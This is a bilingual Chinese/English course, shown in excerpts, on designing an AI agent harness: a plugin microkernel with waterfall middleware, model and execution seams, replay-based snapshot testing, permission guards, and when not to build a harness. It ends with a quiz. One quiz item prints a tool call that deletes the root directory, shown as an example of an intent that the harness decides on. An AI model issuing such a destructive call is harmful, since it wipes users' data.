最值得偷的是它文档里的一条硬规矩：每个包的 README 都必须写清楚自己的 Model Experience——模型会看到什么、Token effect 是什么、KV Cache effect 是什么。换句话说，"我这个功能会往上下文里塞多少字节、会不会打掉前缀缓存"，在那个仓库里是写进文档、被检查的契约，而不是某个人心里的估计。这一课教的所有东西，在那边是每个插件都必须回答的三个问题。

The most stealable thing is a hard documentation rule over there: every package README must state its Model Experience — what the model sees, the Token effect, and the KV Cache effect. In other words, "how many bytes does my feature add to the context, and does it break the prefix cache" is a documented, checked contract in that repository rather than someone's private estimate. Everything this lesson teaches is, over there, three questions every plugin has to answer.

三件很正常的需求，在 L1–L6 的代码里都要改同一个地方：公司要求走内网的模型；仓库太大，想让 agent 在一台远程机器上跑；跑测试时不想每次都花钱调真模型。但"跟谁说话"是循环里的一段 fetch，"在哪干活"是循环里的一段 readFile——它们焊死在同一个函数里。

Three ordinary requirements all land on the same lines in the L1–L6 code: the company requires an internal model; the repository is huge and you want the agent to run on a remote box; the test suite should not pay for a real model on every run. But "who you talk to" is a fetch inside the loop and "where the work happens" is a readFile inside the loop — welded into one function.

于是每加一种可能，循环里就多一个 if。三种模型乘三种执行环境，就是九个分支——而且这九个分支会互相污染：远程执行的重试逻辑会渗进模型调用，模型的流式处理会渗进文件读取。这不是代码丑，是没有一个地方可以让第三方接进来。

So every new option adds another if. Three models times three execution environments is nine branches, and those branches contaminate each other: retry logic for the remote leaks into the model call, streaming for the model leaks into file reading. The problem is not ugliness — it is that there is no place for a third party to plug in.

概念CONCEPT

① 契约要为所有现有消费者设计，不能被第一个消费者绑架。这一课的 readFile 契约带 offset/limit，不是因为好看，是因为 L6 的溢出需要"接着往下读"。如果只照 L1 的需要写，这个契约会在 L6 那天被迫改动——而改契约意味着所有实现一起改。反过来也要克制：别把某一个实现的特性塞进契约（比如把"sandbox 模式"写进 readFile 的参数），那样别的实现只能假装支持。

① Design the definition for all current consumers, not the first one. The readFile definition here carries offset/limit not for elegance but because L6's spill needs "read on from here." Written only for L1's needs, it would have had to change on the day L6 arrived — and changing a definition means changing every provider. The converse discipline matters too: never push one provider's specialty into the definition (a "sandbox mode" parameter on readFile, say), or the other providers can only pretend to support it.

② 默认值属于实现，而且要显式。worldLocal 里的"工作区根目录"是它自己的事；契约不提这回事。dsh 把这条写得更狠：默认应该是实现里一个显式的 resolve(request) → spec 步骤，而不是 run() 里藏一个 ?? 默认值。区别在于：前者你能把最终生效的参数打印出来、记进日志、给人看；后者只有作者知道。

② Defaults belong to the provider, and must be explicit. The workspace root inside worldLocal is its own business; the definition never mentions it. dsh states this more strictly: defaulting should be an explicit resolve(request) → spec step in the provider, not a hidden ?? default inside run(). The difference is that the first can be printed, logged, and shown to a human; the second is known only to whoever wrote it.

③ 能力是成组替换的。你不能只把 readFile 搬到远程、把 listDir 留在本地——那样模型会看到一个精神分裂的世界：列出来的文件读不到。共享同一个执行环境的能力必须一起换：文件、子进程、终端、语言服务是一组。dsh 把这条说成"容器、微虚拟机、远程执行器不是沙箱接缝的后端，它们替换的是整组能力提供者"——L5 那张四档图里的那条竖线，就是这个意思。

③ Capabilities are swapped in groups. You cannot move readFile to the remote and leave listDir local — the model would see a schizophrenic world where listed files cannot be read. Capabilities sharing one execution environment must move together: filesystem, subprocess, terminal, language server are one group. dsh puts it as "containers, microVMs, and remote executors are not backends of the sandbox seam; they replace whole groups of capability providers" — which is exactly the vertical line in L5's four-tier figure.

④ 什么时候不该做接缝。判据只有一个：这几个角色会不会各自独立演化？如果只会有一个实现、而且看不到第二个的可能，那接缝就是纯粹的成本。有一个很准的反面气味：一个公开方法只有一个内部调用者——那说明它不是能力，是那个调用者的私事，传一个闭包进去就够了。这一课的两条接缝之所以成立，是因为它们的第二个实现当场就写出来了，而且真的有用。

④ When not to build a seam. One test: will the roles evolve independently? If there will only ever be one provider and no second one is imaginable, the seam is pure cost. A sharp smell: a public method with exactly one internal caller — that is not a capability but that caller's private business, and a closure parameter is enough. The two seams in this lesson qualify because their second providers were written on the spot, and both are genuinely useful.

概念CONCEPT

① 内核不知道什么是工具。整个内核不到 60 行，里面没有"工具""模型""权限"这些词。它只知道：谁提供了名字叫 X 的服务、谁在听名字叫 Y 的事件、以及怎么把一个插件连根拔掉。业务词汇一旦进内核，微内核就名存实亡。

① The kernel does not know what a tool is. The whole kernel is under sixty lines and contains none of the words "tool," "model," or "permission." It knows only who provides a service named X, who listens for an event named Y, and how to tear a plugin out by the roots. The moment domain vocabulary enters the kernel, the microkernel is one in name only.

② waterfall 必须调 next()。这是整课最需要背下来的一句。链上每一层拿到 (值, next)：调 next() 就把控制权交给下一层，不调就到此为止。权限插件拒绝的方式，不是抛异常、不是返回 false，而是直接不调 next——于是真正的执行根本没有发生。反过来，溢出插件要在结果上做文章，所以它先 await next() 拿到结果再改。两种写法都在同一条链上，位置不同、意图不同。

② A waterfall listener must call next(). This is the sentence to memorize. Each layer receives (value, next): calling next() hands control down, not calling ends it here. The permission plugin refuses not by throwing, not by returning false, but by simply not calling next — so the real execution never happens. The spill plugin, wanting to alter the result, does the opposite: await next() first, then rewrite. Both idioms live on the same chain, differing in position and intent.

③ 注册即 effect，返回怎么撤销。provide 和 on 都返回一个 disposer，插件装载时把它们记在案，卸载时反向执行。这不是洁癖：它是热重载、每个 agent 一份作用域、以及"一个子 agent 结束后不留痕迹"的地基。实测里卸掉日志插件，监听器从 10 个变成 3 个、服务表里的 log 当场消失。

③ Registration is an effect that returns its undo. Both provide and on return a disposer; loading records them and unloading runs them in reverse. This is not fastidiousness: it is the foundation for hot reload, per-agent scopes, and "a finished subagent leaves no trace." In the transcript, unloading the log plugin drops listeners from ten to three and removes log from the service table on the spot.

④ 没有特权核心——连循环也是插件。这一课的 loop 和 permission 一样，是清单里的一行；它注册了一个叫 agent 的服务，仅此而已。判断一个系统是不是真的"一切皆插件"，就看它的主循环能不能被换掉。dsh 把这条写死成规矩：agent-loop 是唯一含有具体循环逻辑的包，而且任何插件都不许依赖它。

④ No privileged core — even the loop is a plugin. Here loop is one line in the catalog exactly like permission; it registers a service called agent, and that is all. To test whether a system truly is "everything is a plugin," check whether its main loop can be replaced. dsh makes it a rule: agent-loop is the only package containing concrete loop logic, and no plugin may depend on it.

⑤ 监听器顺序不是优先级。装载顺序决定了链上的位置，但你不能靠它表达"权限比溢出重要"。顺序是装配的偶然结果，策略优先级必须显式表达。dsh 的说法是：兄弟监听器的顺序不是优先级机制，每个部署组合一个终审回答者。这条不遵守，系统会在某次插件顺序调整后悄悄失去安全性。

⑤ Listener order is not priority. Load order fixes position on the chain, but you cannot use it to express "permission outranks spill." Order is an accident of composition; policy priority must be stated explicitly. dsh puts it as: sibling listener order is not a priority mechanism — compose one terminal answerer per deployment. Ignore this and a system quietly loses its safety the day someone reorders plugins.

// 内核：注册、派发、生命周期。没有一个业务词汇。
class Kernel {
  provide(name, impl) { this.services.set(name, impl); return () => this.services.delete(name) }
  on(event, listener) { …; return () => list.splice(list.indexOf(listener), 1) }

  emit(event, payload) {                          // 广播：返回值被忽略，谁也改不了别人看到的
    for (const listener of this.listeners.get(event) ?? []) listener(payload)
  }

  async waterfall(event, payload, terminal) {     // 环绕中间件：唯一有权力的机制
    const chain = [...(this.listeners.get(event) ?? [])]
    const step = async (i, value) =>
      i === chain.length ? terminal(value) : chain[i](value, (next = value) => step(i + 1, next))
    return step(0, payload)
  }

  use(plugin, config = {}) {                      // 装载：记下它注册的一切，返回连根拔起的函数
    const undo = []
    plugin({ get: …, provide: (n, i) => undo.push(this.provide(n, i)),
             on: (e, l) => undo.push(this.on(e, l)), emit: …, waterfall: …, config })
    return () => { for (const dispose of undo.reverse()) dispose() }
  }
}

对照SPECIMEN

dsh 的第一句话就是"一切皆插件"，而它把这句话执行到了会让人不适的程度：没有特权核心，模型适配器、工具注册、会话日志、agent 循环本身都是可替换的插件。它用的是 Cordis：插件往共享的 Context 上贡献服务、类型化事件和可撤销的 effect；每一个贡献都走 ctx.effect() / ctx.on()，注册表的 register() 返回的就是撤销函数。派发正是上面那四种模式，而且它把"waterfall 监听器必须调 next() 才算委托，直接返回就是短路"写进了必须遵守的约定里。

dsh opens with "everything is a plugin," and follows it to an uncomfortable degree: there is no privileged core, and the model adapters, tool registry, session log, and the agent loop itself are all replaceable plugins. It uses Cordis: plugins contribute services, typed events, and reversible effects to a shared Context; every contribution goes through ctx.effect() / ctx.on(), and a registry's register() returns the disposer. Dispatch is exactly the four modes above, and it writes into its conventions that a waterfall listener MUST call next() to delegate; returning without it short-circuits the chain.

两条它做而你现在还没做的事，值得记下来。一是每个包都要证明自己能被卸干净：它的测试规约要求"注册表贡献必须通过 HMR 安全测试证明可释放——销毁 fiber，然后观察它确实消失了"。你刚才那个 --prove-dispose 就是这条规矩的手工版。二是新行为挂在文档化的扩展点上，改 agent-loop 需要同时更新架构文档——换句话说，"往核心里加一行"在那个仓库里是一件需要解释的事，而不是默认选项。

Two things it does that you have not yet. First, every package proves it can be torn out cleanly: its testing policy requires that "registry contributions prove disposal through an HMR-safety test — dispose the fiber and observe removal." Your --prove-dispose is the manual version of that rule. Second, new behavior attaches to documented extension points, and changing agent-loop requires updating the architecture document — meaning "add a line to the core" is something that must be justified over there, not a default move.

Five rungs. The higher ones are cheap and should be many; the lower ones are expensive and should be few and sharp. The point is not coverage but what each rung can and cannot catch:

确定性从哪来WHERE DETERMINISM COMES FROM

agent 系统最难测的地方只有一个：模型是不确定的。同一句话问两次，回答不一样、调用的工具也可能不一样。于是很多人退回去只测纯函数，然后把整条链路交给运气。

There is exactly one hard thing about testing an agent: the model is nondeterministic. Ask twice and you get different words and possibly different tool calls. Most people retreat to unit tests and leave the whole pipeline to luck.

出路是 L7 那条接缝：把模型那一侧换成"回放"——从 L4 记下来的日志里，按顺序放回模型当初说过的话。于是链路的其余部分全部真跑：工具真读文件、权限真判定、溢出真落盘、投影真投影，而整体是确定的。这一课的回放测试跑完整条 agent 循环只要 2 毫秒，不联网、不花钱。

The way out is L7's seam: replace the model side with replay, feeding back in order what the model said in an L4 log. Everything else really runs — tools read files, permission decides, spill writes, projection projects — and the whole thing is deterministic. The replay test here drives the entire agent loop in 2 milliseconds, offline and free.

这句话值得单独记住：可测性是架构的结果，不是测试框架的功能。没有 L4 的日志，就没有可回放的素材；没有 L7 的接缝，就没有地方把模型换掉。你在 L4/L7 做的两个决定，到 L9 才收租。

One sentence to keep: testability is a result of architecture, not a feature of a test framework. Without L4's log there is nothing to replay; without L7's seam there is nowhere to swap the model out. Two decisions made in L4 and L7 collect their rent in L9.

也要知道回放的边界：它只能证明"给定同样的模型输出，我的代码行为不变"，不能证明"模型还会那样输出"。后者只有真 API 的 e2e 能答——所以 e2e 要有，但少而精，只用来确认契约还在。

Know its limit too: replay proves "given the same model output, my code behaves the same," not "the model still produces that output." Only live e2e answers the second — so keep a few, sharp, and only to confirm the contract still holds.

Normalizers may erase only non-behavior (ids, timestamps); the moment they start erasing byte counts, the snapshot is dead weight.

对照SPECIMEN

dsh 的测试规约几乎每一条都能直接抄。它把快照定成硬门槛：任何"模型可见或用户可见的行为变化"，都必须在同一个 PR 里通过一个真实可运行的示例补上或更新一份无密钥快照；而且明说包级单测、只跑 e2e 的断言、纯 mock 的夹具，都不能替代"组装后的应用 transcript"——这正是你上面那个 51 毫秒的回放要断言的东西。夹具必须在 macOS 和 Linux 都能重放，而且"修夹具，不要修 normalizer"，和你刚踩的坑一字不差。

dsh's testing policy is copyable almost line by line. It makes snapshots a hard gate: any model-visible or user-visible behavior change must add or update a keyless snapshot through a real runnable example in the same PR, and it states outright that package tests, e2e-only assertions, and mock-only fixtures do not substitute for the assembled application transcript — exactly what your 51-millisecond replay asserts. Fixtures must replay on both macOS and Linux, and "fix fixtures, not normalizers" — word for word the trap you just hit.

另外三条同样值钱。①"拒绝要从执行器那一端测"——schema 里不写、prompt 里过滤、外面包一层门面都不算强制，测试必须证明那个真会动文件的东西没动。②注册表贡献必须通过 HMR 安全测试证明能被释放：销毁 fiber，然后观察它确实消失了——就是你那个 dispose 测试。③"测试描述行为，不描述正确性"：行为过时了就连着它的测试一起改，并在 PR 里解释为什么。这句话是快照测试能长期活下去的唯一理由——快照红了不代表你错了，它只是在问"这次变化是你想要的吗"。

Three more are just as valuable. ① "Test denial through the executor" — schema omission, prompt filtering, and facades are not enforcement; the test must show that the thing which really touches files did not. ② Registry contributions must prove disposal via an HMR-safety test: dispose the fiber and observe removal — your dispose test. ③ "Tests describe behavior, not correctness": when behavior becomes obsolete, change it together with its tests and explain why in the PR. That sentence is the only reason snapshot testing survives long-term — a red snapshot does not mean you are wrong, it asks whether this change was intended.

对照SPECIMEN

dsh 把"形态是最外一层"做成了产品事实：同一批包，靠 profile 装出完全不同的东西——dsh --profile headless 是一次性 CLI runner，web-app 是浏览器应用，acp 是只给自动化用的协议服务。它的 dsh-base 是每个 profile 的第一层（模型适配、工具、持久化、沙箱与审批策略、设置、凭据、遥测），上面各自叠不同的壳。换形态在那边是改一份 YAML，不是改代码。

dsh turns "shape is the outermost layer" into a product fact: one set of packages composes into entirely different things through profiles — dsh --profile headless is a one-shot CLI runner, web-app is a browser application, acp is an automation-only protocol server. Its dsh-base is the first layer of every profile (model adapters, tools, persistence, sandbox and approval policy, settings, credentials, telemetry), with different shells stacked on top. Changing shape there edits a YAML file, not code.

而你刚才手工做的那个 --isolate，在那边是 Agent.ctx 的 per-agent 作用域：每个 agent 自己一份注册，销毁即全部解除。它同时也是子 agent 能存在的前提——没有作用域隔离，"派一个子 agent 去读一百个文件"这件事根本没法做，因为它的工具、监听器、日志会和主 agent 搅在一起。

And the --isolate you just built by hand is Agent.ctx's per-agent scope over there: each agent owns its registrations and releases them on destruction. It is also the precondition for subagents — without scope isolation, "dispatch a child agent to read a hundred files" cannot work at all, because its tools, listeners, and logs would tangle with the parent's.

练习EXERCISE

一、给你自己的场景答那四个问题。谁触发、文件在哪、凭据属于谁、会话活多久。写下来——如果四个答案里有三个指向 CLI，就别做服务；有两个指向服务，那你要先准备好认证和隔离，而不是先写 agent。

二、把 --isolate 做成默认，并想清楚代价。每个请求一份内核意味着每个请求都要重新装载插件——如果某个插件启动很贵（比如要连数据库、要探测沙箱），这一刀就砍在你脸上。真实系统怎么办？（提示：把"贵且无状态"的东西留在共享层，把"有状态且属于这一次"的东西放进作用域。）

三、给它加第三种壳：stdio 协议。把 http 插件换成一个读写 stdin/stdout JSON 行的插件——这就是 MCP、ACP、LSP 共同的形状。做完你会发现：这三种协议之所以能存在，正是因为 agent 逻辑从来不知道自己被装在什么壳里。

1. Answer the four questions for your own case. Who triggers, where the files are, whose credentials, how long a session lives. Write them down — if three answers point at a CLI, do not build a service; if two point at a service, prepare auth and isolation before writing any agent code.

2. Make --isolate the default and reason about the cost. One kernel per request means reloading plugins per request, which hurts if a plugin is expensive to start (a database connection, a sandbox probe). What do real systems do? (Hint: keep the expensive stateless things shared and put the stateful per-request things in the scope.)

3. Add a third shell: a stdio protocol. Replace the http plugin with one that reads and writes JSON lines on stdin/stdout — the shared shape of MCP, ACP, and LSP. When it works you will see why those protocols can exist at all: the agent logic never knew which shell it was in.

这一课的立场THE POSITION

前面十一课教你怎么做，这一课的任务是把刹车装上。做一个 harness 的真实成本，不是那 2055 行代码，而是它带来的长期负债。模型 API 会变，上下文窗口会变，协议一年改几次，沙箱机制会被标记废弃（sandbox-exec 就是），工具生态每季度换一批。你签的是一份订阅，不是一次性付款。

Eleven lessons taught you how; this one installs the brakes. The real cost of a harness is not the 2,055 lines but the long-term liability it creates. Model APIs change, context windows change, protocols revise several times a year, sandbox mechanisms get deprecated (sandbox-exec already is), and the tool ecosystem turns over quarterly. You are signing a subscription, not making a one-time payment.

所以问题从来不是"我能不能做"——学完这门课你显然能——而是"这些代码值不值得由我来写、由我来维护"。下面这张图是我能给的最实用的东西：一层层往下问，凡是能在上面某一层停住的，就别往下走。

So the question was never "can I build one" — after this course you clearly can — but "is this code worth me writing and me maintaining". The figure below is the most useful thing I can hand you: ask down the levels and stop at the first one that answers yes.

五个"别做"的信号FIVE SIGNS TO STOP

① 路径是确定的。如果你能把输入到输出画成流程图，那就写脚本——它更快、更便宜、结果每次一样，而且不会在半夜编造一个不存在的目录。agent 的价值在于"路径不确定"，不在于"会说话"。这是最常见的误用：拿一个非确定性的、按 token 收费的、每次结果都不同的东西，去干一件 for 循环能干的事。

① The path is deterministic. If you can draw input-to-output as a flowchart, write a script: faster, cheaper, identical every time, and it will not invent a directory that does not exist at three in the morning. An agent's value is that the path is unknown, not that it talks. This is the most common misuse — paying per token for nondeterminism to do a job a for loop already does.

② 只跑一次。harness 的成本要到第一百次运行才摊得平。一次性的分析、迁移、清理，打开任何一个现成产品聊完就行——你在 L10 那次真实运行（分析 219 个包的仓库）用的就是这个模式：一个八十行的脚本 + 一次对话，够了。

② It runs once. A harness only amortizes around the hundredth run. One-off analyses, migrations, and cleanups belong in whatever product you already have open — which is exactly what L10's real run did (analysing a 219-package repository): an eighty-line script and one conversation was enough.

③ 你缺的其实只是一个工具。这是最容易走错的一层。"现成的 agent 不知道我们内部系统"——那就写一个 MCP server，几十行，挂到你已经在用的产品上，立刻拥有它全部的权限模型、上下文管理、UI 和更新。做一个 harness 来解决"少一个工具"，是这门课里我见过最贵的错误。

③ All you actually lack is a tool. This is the level people get wrong most often. "The existing agent does not know our internal systems" — then write an MCP server, a few dozen lines, plug it into the product you already use, and inherit its entire permission model, context management, UI, and updates. Building a harness to fix "one missing tool" is the most expensive mistake in this course.

④ 没有可验证的成功标准。如果你说不清"什么叫做对了"，agent 会稳定地生产看起来对的东西，而你没有任何办法发现它错了。L9 教的那一整套——回放、快照、把模型看见的字节钉住——在这种场景里根本无从下手：你连要钉住什么都不知道。先把验收标准写出来，再考虑要不要自动化。

④ There is no verifiable definition of done. If you cannot state what "correct" means, an agent will reliably produce things that look correct and you will have no way to notice otherwise. Everything L9 taught — replay, snapshots, pinning the bytes the model sees — has no purchase here: you do not even know what to pin. Write the acceptance criteria first, then decide about automation.

⑤ 真正的约束是合规而不是能力。"数据不能出我们的边界"是个采购与部署问题，不是 harness 问题。自研一个 harness 并不会让你获得私有推理能力，只会让你在解决错误问题的路上多花半年。

⑤ The real constraint is compliance, not capability. "Our data cannot leave the perimeter" is a procurement and deployment problem, not a harness problem. Building your own harness does not grant you private inference; it just spends six months on the wrong problem.

中间道路THE MIDDLE PATHS

"自研 vs 用现成"是个假二分。真实世界里有四条路，成本差一个数量级：①现成产品 + 自己的 MCP server——拿到工具集的全部价值，成本几十行，别人替你维护权限、上下文、UI。②现成的 agent SDK——拿到循环、权限、上下文管理，你只写工具和提示词；代价是被那个 SDK 的抽象绑住。③分叉一个开源 harness——拿到全部控制权，同时接手全部维护；这条路最容易被低估：分叉的那一刻起，上游的每一次更新都变成你的合并工作。④从零自研——只有当前三条都不成立时。

"Build versus buy" is a false binary. There are four real paths, an order of magnitude apart in cost: ① an existing product plus your own MCP server — you capture the full value of your tools for a few dozen lines while someone else maintains permissions, context, and UI. ② an existing agent SDK — you get the loop, permissions, and context management and write only tools and prompts, at the price of being bound to that SDK's abstractions. ③ forking an open-source harness — full control and full maintenance; the most underestimated path, because from the moment you fork, every upstream update becomes your merge work. ④ building from zero — only when the first three do not hold.

还有一条几乎没人说、但这门课已经证明了的：你可以只自研那一层真正属于你的东西。L11 的实测说得很清楚——工具、权限、日志是你的产品；壳、协议、沙箱机制、模型调用都可以是别人的。自研不是全有或全无，边界正好画在接缝上。

And one nobody mentions that this course already demonstrated: you can build only the layer that is genuinely yours. L11's experiment said it plainly — tools, permission, and the log are your product; shells, protocols, sandbox mechanisms, and model calls can all be someone else's. Building is not all-or-nothing, and the boundary falls exactly on the seams.

收尾CLOSING

这门课最大的价值，可能不是让你能自研，而是让你不必自研。你现在能打开任何一个 agent 产品，问出那六个问题：执行发生在哪里？有没有唯一入口？状态是攒的还是投影的？防线设在名字上还是效果上？哪里留了接缝？行为被什么钉住？——然后判断它值不值得信任、能不能扩展、会在哪儿出事。这份判断力比那 2055 行值钱得多，而且它不会随着某个 API 的改版过期。

The greatest value of this course may be not that you can build one, but that you need not. You can now open any agent product and ask the six questions: where does execution happen? is there exactly one entry? is state accumulated or projected? are guards on names or effects? where are the seams? what pins the behavior? — and then judge whether it deserves trust, whether it can be extended, and where it will break. That judgment is worth far more than the 2,055 lines, and it does not expire when an API revises.

最后回到 L0 那句话。整门课绕了十二课，其实只证明了一件事：模型是一个无状态的函数，所有"它好像在思考、在坚持、在记得"的感觉，都是你的代码制造出来的。循环是你写的，工具是你执行的，记忆是你投影的，边界是你设的，连"它在做一个多步任务"这个印象都是你的 for 循环制造的幻觉。

Finally, back to L0. Twelve lessons proved exactly one thing: the model is a stateless function, and every impression that it is thinking, persisting, or remembering is manufactured by your code. You wrote the loop, you executed the tools, you projected the memory, you drew the boundaries — even "it is working through a multi-step task" is an illusion produced by your for loop.

所以"要不要做 harness"这个问题，最后其实是：这些制造幻觉的代码，值不值得由你来写、由你来维护？答案是"值得"的时候，你现在知道该怎么做；答案是"不值得"的时候——那是这门课教给你的更重要的一半。

So "should I build a harness" comes down to: is this illusion-making code worth me writing and me maintaining? When the answer is yes, you now know how. When the answer is no — that is the more important half of what this course was for.

金鱼博士LLM 是无状态的

The fish can't reach anything. You are outside: you have hands (tools), a notebook (state), and you keep asking "what next?" (the loop). The fish has ideas; you do the doing. That is the whole of it.

点菜不等于上菜tool call 是意图

金鱼说「我要一份读文件」，就像小孩指着菜单说「我要这个」。说出来菜不会自己飞过来——厨房是你。你可以做，可以说「卖完了」，也可以说「太辣了不给你点」。说不等于做，所以责任在你这边。

The fish says "one file-read, please" — like a child pointing at a menu. Saying it does not make food fly over; you are the kitchen. You can cook it, say "we're out of that", or say "too spicy, not for you." Saying is not doing, which is why the responsibility is yours.

04

一顿饭与一道菜turn 与 step

A meal and a dishturn and step

One dish (a step) = ask the fish once, then do the one thing it asked for. One meal (a turn) = from the moment you speak until the work is done and you speak again. A meal usually contains several dishes.

05

日记本，不是脑子事件日志与投影

别把事情记在脑子里（内存里的数组），要写在日记本上，一行一行只能往后加、不能涂改。想知道金鱼现在应该知道什么，就把日记从头念给它听。本子还能复印一份从中间接着写（分叉）。本子在，事情就丢不了。

A diary, not a memoryevent log and projection

Don't keep things in your head (an array in memory). Write them in a diary, one line at a time, append-only, never erased. To know what the fish should know right now, read the diary aloud from the top. You can photocopy the diary and continue from the middle (a fork). While the book exists, nothing is lost.

B。这只是一个意图，跟小孩指着菜单说「我要这个」一样。删不删完全取决于你的代码——也正因为如此，这里是唯一能加权限的地方。选 C 的话要小心：模型没有「权限」这个东西，权限是你实现的。

Q3agent 的三样东西是什么？分别对应 L1 代码里的哪一行？

看答案

循环、工具、状态。循环是 for (let step = 1; ...)；工具是 tools 数组加 runTool；状态是 messages.push(...)。代码里那三个箭头标的就是它们。

Q4把 L1 里的 10 改成 1，会发生什么？为什么说这个数字是「策略」而不是 bug？

看答案

你多半只会看到一次工具调用，然后程序结束，永远等不到最终回答。它不是 bug，因为代码完全按写的执行了；它是策略，因为这个数字是你替 agent 做的决定——属于「做多少」，不属于「怎么做」。好的 harness 会把这类数字挪到配置里、让插件能改，而不是焊死在循环中间。

Q5String(result).slice(0, 4000) 这一行有两个隐患，是哪两个？

看答案

一，被切掉的内容永远消失了，而且模型不知道自己拿到的是残缺的——它会拿半份数据当全部来推理。二，按字节截断会切碎多字节字符，中文会变成乱码。正确做法是：告诉模型「这里被截断了」，并给它一个取回剩余部分的办法。

Q6为什么「日记本」比「脑子里的数组」重要？说出至少三件因此变简单的事。

看答案

崩溃后能续跑；能回看第三步到底发了什么（调试）；能从中间分叉；能把整段录下来做回放测试；UI 能从同一份记录重建；遥测有唯一口径。关键一句：这些本来是五六套各自为政的机制，有了唯一真相源之后变成一套。

Q7同事想加「危险命令要先问我」的功能，打算在 runTool 里加一串 if。这么做有什么问题？

看答案

把策略焊进了机制。每加一条规矩这个函数就更肥，规矩之间还会互相纠缠；更糟的是，任何绕过 runTool 的调用路径都会让这条规矩失效——而安全规则一旦能被绕过就等于没有。正确位置是厨房门口那道安检（执行管线），工具本身不该知道有这条规矩存在。

Q8你想让 agent 在远程机器上执行命令而不是本机。如果设计得好，模型看到的工具说明书需要改吗？

看答案

不需要，而且「需不需要改」正是检验设计好坏的标准。工具 schema 是台灯，执行方式是插头。契约不变，换实现就不该震动模型面——反过来，如果换个执行环境就要改工具描述，说明这三个角色被焊在了一起。

Q9一次运行里模型连调了 20 次工具，上下文塞不下了。列出三种应对，并说清各自会丢什么。

看答案

这题没有标准答案，看的是你能不能说出代价：直接截断——丢细节，而且模型不知道自己在盲区里；摘要压缩——丢精确性，但可控，前提是「压缩过」这件事本身也要记进日记；溢出到外部再给句柄——不丢东西，但多一次取回的往返，也多一个句柄失效的可能；派给子 agent 去读、只回报结论——主上下文不涨，但多了协调成本和信息传递的损耗。能说出「每种方案丢什么」就算过。

Q10为什么说「harness 的大部分代码，都活在模型提出意图和系统真的执行之间那道缝里」？

看答案

因为模型只能说，不能做。权限、审批、沙箱、审计、超时、重试、结果截断与溢出、日志、回放——全都发生在「说」和「做」之间那一段。那一段完全是工程问题，跟模型聪不聪明无关，所以它才是你真正要设计的东西。

对六题以上：可以进 L2。Q6–Q10 只对两题以下：别急着往下走，回去把 L0 的第三句和 L1 的四颗种子再读一遍——后面每一课都建在这两处上。

Q1If I close the program and reopen it, does the model remember our conversation? Why?

Reveal

No — and it never "remembered" in the first place. The model is stateless; the memory you perceive comes entirely from you resending the history. Keeping state was never a feature of the model; it is your job.

Q2The model emits {"name":"delete_file","arguments":{"path":"/"}}. What has happened at this moment?

A. The files are deleted　B. It asked; nothing has happened yet　C. It lacked permission, so it failed

Reveal

B. This is an intent, exactly like a child pointing at a menu. Whether anything gets deleted is entirely up to your code — which is precisely why this is the only place permission can exist. Be wary of C: the model has no "permissions"; permissions are something you implement.

Q3What are the three parts of an agent, and which line of the L1 code is each?

Reveal

Loop, tools, state. The loop is for (let step = 1; ...); the tools are the tools array plus runTool; the state is messages.push(...). Those are the three arrows in the listing.

Q4Change the 10 in L1 to 1. What happens, and why is that number a policy rather than a bug?

Reveal

You will usually see one tool call and then the program ends — the final answer never arrives. It is not a bug, because the code did exactly what it says; it is a policy, because that number is a decision you made on the agent's behalf. It belongs to "how much", not "how". A good harness moves such numbers into configuration where a plugin can change them, instead of welding them into the middle of the loop.

Q5String(result).slice(0, 4000) carries two hazards. Which two?

Reveal

One: the cut-off part is gone forever, and the model does not know it received a fragment — it will reason over half the data as if it were all of it. Two: byte-based truncation slices multi-byte characters in half, turning CJK text into garbage. The correct move is to tell the model it was truncated and give it a way to fetch the rest.

Q6Why is the "diary" better than an array in memory? Name at least three things it makes simple.

Reveal

Resume after a crash; review what step three actually sent (debugging); fork from the middle; record a whole run for replay testing; rebuild the UI from the same record; give telemetry one authority. The point in one sentence: these were five or six separate mechanisms, and a single source of truth collapses them into one.

Q7A colleague wants "ask me before dangerous commands" and plans to add a chain of ifs inside runTool. What is wrong with that?

Reveal

It welds policy into mechanism. Each new rule fattens the function and tangles with the others; worse, any call path that bypasses runTool silently bypasses the rule — and a safety rule that can be bypassed is not a safety rule. The right home is the checkpoint at the kitchen door (the execution pipeline), where the tool itself never learns the rule exists.

Q8You want the agent to run commands on a remote machine instead of locally. In a good design, does the tool description the model sees have to change?

Reveal

No — and "does it have to change" is exactly the test of whether the design is good. The tool schema is the lamp; the execution environment is the plug. Keep the contract and swapping the implementation must not disturb the model-facing surface. Conversely, if changing where things run forces you to edit tool descriptions, those three roles have been welded together.

Q9The model chained twenty tool calls and the context no longer fits. Name three responses and say precisely what each one loses.

Reveal

No single right answer; what counts is naming the cost. Plain truncation — loses detail, and the model cannot tell it is operating blind. Summarize and compact — loses precision, but controllably, provided the act of compaction is itself recorded in the diary. Spill outside and hand over a handle — loses nothing, but adds a round trip and a way for handles to go stale. Delegate the reading to a sub-agent that reports conclusions — keeps the main context small, at the cost of coordination and lossy hand-off. If you can state what each one loses, you pass.

Q10Why does most of a harness's code live in the gap between the model proposing an intent and the system executing it?

Reveal

Because the model can only speak, never act. Permission, approval, sandboxing, audit, timeouts, retries, truncation and spill, logging, replay — all of it happens between the saying and the doing. That stretch is pure engineering, independent of how smart the model is, which is why it is the thing you actually have to design.

由此能推出三件有用的事。第一，"它正在做一个多步任务"是你制造的幻觉。模型是无状态的，每次请求它都从零读一遍历史；连续性来自你的循环和你的日志，不来自它。第二，管线、守卫、审批框、沙箱模式，模型统统看不见。它只能从历史里推断出"我上一步调了工具，然后收到了一条结果"。想让它知道当前是 read-only 模式、或者审批已被关掉，你必须把这句话显式写进它看得见的字节里——这正是"模型可见 ⟺ 已记录"的另一半，dsh 就是把审批策略作为一条运行时上下文注入的。第三，你所有的控制杠杆都在代码侧：模型侧只有三样输入——system prompt、tools schema、历史内容。除此之外你对它没有任何直接控制。

Three useful consequences. First, "it is working through a multi-step task" is an illusion you manufacture. The model is stateless and re-reads the history from scratch every request; continuity comes from your loop and your log, not from it. Second, the pipeline, the guards, the approval prompt, and the sandbox mode are all invisible to it. All it can infer from the history is "I called a tool and then received a result." If you want it to know the mode is read-only, or that approvals are disabled, you must write that explicitly into bytes it can see — the other half of "model-visible ⟺ logged," and exactly how dsh injects approval policy as runtime context. Third, every lever you have is on the code side: the model side offers only three inputs — system prompt, tools schema, and the history. Beyond those you have no direct control at all.

